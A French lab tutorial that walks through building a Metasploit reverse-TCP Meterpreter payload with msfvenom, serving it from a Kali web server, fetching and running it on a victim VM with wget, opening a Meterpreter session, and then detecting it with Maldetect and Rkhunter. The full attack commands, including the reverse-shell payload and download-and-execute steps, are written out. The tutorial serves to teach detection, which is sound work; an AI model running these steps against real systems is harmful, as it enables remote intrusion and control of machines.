Cette procédure  vise à démontrer comment un payload malveillant peut être généré et exécuté, puis comment des outils comme **Rkhunter** ou **Linux Malware Detect (LMD)** peuvent le détecter.

-----

### **Phase 1 : Préparation de la Machine Attaquante (Kali Linux)**

L'objectif ici est de mettre en place un "écouteur" qui attendra la connexion de la machine victime.

#### **1. Lancer la console Metasploit (MSF)**

Ouvrez un terminal sur votre machine Kali et lancez `msfconsole`.

```bash
msfconsole
```

#### **2. Configurer le gestionnaire d'écoute (handler)**

Dans la console MSF, nous allons configurer un gestionnaire générique pour recevoir la connexion inverse.

```bash
# Utiliser le module de gestion générique
use exploit/multi/handler

# Définir le type de payload attendu (doit correspondre au payload que nous créerons)
set PAYLOAD linux/x86/meterpreter/reverse_tcp

# Définir l'adresse IP de votre machine Kali (la machine qui écoute)
# Pour trouver votre IP, ouvrez un autre terminal et tapez : ip addr show
set LHOST <IP_de_votre_Kali>

# Lancer l'écouteur. Il attendra une connexion.
run
```

**Laissez ce terminal ouvert.** Il est maintenant en attente active d'une connexion.

-----

### **Phase 2 : Création et Distribution du Payload**

Maintenant, nous allons créer le fichier malveillant et le rendre accessible à la victime.

#### **3. Générer le payload avec MSFvenom**

Ouvrez un **nouveau terminal** sur votre machine Kali.

```bash
# Générer un exécutable ELF pour Linux
# -p : spécifie le payload (le même que pour l'écouteur)
# LHOST : l'IP de la machine Kali où le payload doit se connecter
# -f : le format du fichier (elf pour un exécutable Linux)
# -o : le nom du fichier de sortie
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_de_votre_Kali> LPORT=4444 -f elf -o /tmp/payload.bin
```

#### **4. Mettre le payload à disposition via un serveur web**

Le moyen le plus simple de transférer le fichier est d'utiliser un serveur web Apache.

```bash
# Démarrer le service Apache2
sudo systemctl start apache2

# Copier le payload dans le répertoire racine du serveur web
sudo cp /tmp/payload.bin /var/www/html/
```

Votre payload est maintenant téléchargeable à l'adresse `http://<IP_de_votre_Kali>/payload.bin`.

-----

### **Phase 3 : Exécution et Détection sur la Machine Victime**

Cette étape simule ce qui se passerait sur le serveur compromis.

#### **5. Télécharger et exécuter le payload**

Connectez-vous au terminal de votre machine victime (votre autre VM).

```bash
# Télécharger le fichier depuis le serveur web de la machine Kali
wget http://<IP_de_votre_Kali>/payload.bin

# Rendre le fichier exécutable
chmod +x payload.bin

# Lancer le payload
./payload.bin
```

**Ne fermez pas ce terminal.** Le processus est maintenant en cours d'exécution en arrière-plan et a dû se connecter à votre machine Kali.

-----

### **Phase 4 : Confirmation de l'Intrusion et Détection**

#### **6. Confirmer la connexion**

Retournez sur le terminal de votre machine Kali où `msfconsole` est en cours d'exécution. Vous devriez voir un message indiquant qu'une session a été ouverte :

```
[*] Meterpreter session 1 opened (192.168.X.X:4444 -> 192.168.X.Y:34567) at ...
```

Vous pouvez maintenant interagir avec la machine victime via cette session Meterpreter :

```bash
# Savoir dans quel répertoire vous êtes
pwd

# Lister les fichiers
ls

# Obtenir de l'aide sur les commandes disponibles
?
```

#### **7. Lancer les outils de détection sur la victime**

C'est l'objectif principal. Maintenant que le payload est actif, voyons comment les outils de sécurité réagissent. Sur le terminal de la **machine victime** :

  * **Avec Linux Malware Detect (LMD / Maldetect)**

LMD est excellent pour scanner les fichiers et trouver des signatures de logiciels malveillants connus. Le payload généré par `msfvenom` a une signature très reconnaissable.

```bash
# Installer maldetect s'il n'est pas présent (Debian/Ubuntu)
#
cd /tmp  
git clone https://github.com/rfxn/linux-malware-detect.git
cd linux-malware-detect/
./install.sh
```

# Lancer un scan sur le répertoire où le payload a été téléchargé (Cibler l'emplacement du payload)
`sudo maldet -a /home/user/`

# Un scan plus large du système de fichiers temporaires est aussi une bonne idée
`sudo maldet -a /tmp/`


**Résultat attendu :** LMD devrait trouver le fichier `payload.bin` et le signaler comme une menace, en se basant sur sa base de données de signatures (par exemple, `LMD.Payload.23`).

  * **Avec Rkhunter (Rootkit Hunter)**

Rkhunter recherche des rootkits, des portes dérobées et des modifications suspectes du système.

```bash
# Mettre à jour la base de données de Rkhunter
sudo rkhunter --update

# Lancer une vérification complète du système
sudo rkhunter --check
```

**Résultat attendu :** Rkhunter pourrait détecter plusieurs choses :

1.  Le fichier `payload.bin` lui-même s'il est considéré comme un fichier de rootkit connu.
2.  Un **processus suspect en mémoire** associé à `./payload.bin`.
3.  Des **ports ouverts suspects** si le payload en avait créé.

En suivant ces étapes, vous démontrez non seulement comment une attaque de base fonctionne, mais surtout, vous prouvez l'efficacité des outils de détection pour identifier la menace, que ce soit au niveau du fichier (`LMD`) ou du comportement du système (`Rkhunter`).